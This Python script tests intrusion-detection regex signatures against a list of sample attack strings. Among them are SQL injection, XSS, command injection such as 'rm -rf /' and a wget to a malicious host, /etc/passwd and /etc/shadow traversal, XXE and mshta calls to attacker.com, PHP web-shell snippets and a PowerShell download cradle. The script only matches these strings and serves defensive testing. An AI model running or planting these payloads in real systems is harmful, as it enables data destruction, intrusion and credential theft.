import json
import re
import sys

# Load signatures from JSON
with open('models/signatures.json', 'r') as f:
    signatures = json.load(f)

# Test payloads - simple and common formats
test_payloads = {
    "sql_injection": [
        "' OR '1'='1",
        "1' UNION SELECT",
        "admin' --",
        "' OR 1=1--",
        "'; DROP TABLE users--",
    ],
    "xss_payload": [
        "<script>alert('xss')</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert('xss')>",
        "<iframe src=javascript:alert('xss')>",
        "'>alert('xss')<",
    ],
    "command_injection": [
        "; cat /etc/passwd",
        "; ls -la",
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& wget http://malicious.com",
        "`ls`",
        "$(whoami)",
    ],
    "path_traversal": [
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "%2e%2e/etc/passwd",
        "../../../etc/shadow",
        "....//....//etc/hosts",
    ],
    "ldap_injection": [
        "*)(",
        "*",
        "*)(&",
        "(|(uid=*",
        "admin*",
    ],
    "buffer_overflow": [
        "A" * 1000,
        "\x90" * 20 + "shellcode",
        "rop chain attack",
        "buffer overflow",
    ],
    "xxe_injection": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!ENTITY xxe SYSTEM "http://attacker.com">',
        '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://attacker.com/xxe.dtd">',
    ],
    "suspicious_encoding": [
        "%3cscript%3e",
        "%27%20or%20%271%27%3d%271",
        "%20or%201=1",
        "%2bor%2b1%3d1",
    ],
    "web_shell": [
        "eval($_POST['cmd'])",
        "system($_GET['cmd'])",
        "passthru($_REQUEST['c'])",
        "shell_exec($_POST)",
        "base64_decode($_REQUEST)",
    ],
    "malware_signature": [
        "powershell -Command IEX(New-Object Net.WebClient).DownloadString('http://...')",
        "cmd /c powershell",
        "certutil -decode base64 output.exe",
        "mshta http://attacker.com/payload.hta",
        "wscript malware.js",
    ],
    "json_injection": [
        '{"admin":1}',
        '{"user":1,"admin":1}',
        'constructor',
        'prototype',
        '";alert(1);//"',
    ],
    "nosql_injection": [
        '{"$where":"1"}',
        '{"$or":[{},{"a":1}]}',
        '{"$ne":null}',
        'db.users.find({$where:"return true"})',
        'MongoDB injection',
    ],
}

# Run tests
print("=" * 80)
print("SIGNATURE REGEX PATTERN TESTING")
print("=" * 80)

results = {}
total_passed = 0
total_failed = 0

for attack_type, patterns in test_payloads.items():
    print(f"\n[{attack_type.upper()}]")
    if attack_type not in signatures:
        print(f"  ⚠️  Pattern not found in signatures.json")
        continue
    
    sig_pattern = signatures[attack_type]["pattern"]
    regex_obj = re.compile(sig_pattern, re.IGNORECASE)
    
    attack_passed = 0
    attack_failed = 0
    
    for payload in patterns:
        match = regex_obj.search(payload)
        if match:
            print(f"  ✅ MATCH: {payload[:60]}...")
            attack_passed += 1
            total_passed += 1
        else:
            print(f"  ❌ NO MATCH: {payload[:60]}...")
            attack_failed += 1
            total_failed += 1
    
    results[attack_type] = {"passed": attack_passed, "failed": attack_failed}
    print(f"  Result: {attack_passed}/{attack_passed + attack_failed} matched")

# Summary
print("\n" + "=" * 80)
print("SUMMARY")
print("=" * 80)
for attack_type, result in results.items():
    total = result['passed'] + result['failed']
    percentage = (result['passed'] / total * 100) if total > 0 else 0
    status = "✅" if result['failed'] == 0 else "❌"
    print(f"{status} {attack_type}: {result['passed']}/{total} ({percentage:.0f}%)")

print(f"\nOverall: {total_passed}/{total_passed + total_failed} payloads matched ({total_passed/(total_passed+total_failed)*100:.0f}%)")
print("=" * 80)

sys.exit(0 if total_failed == 0 else 1)
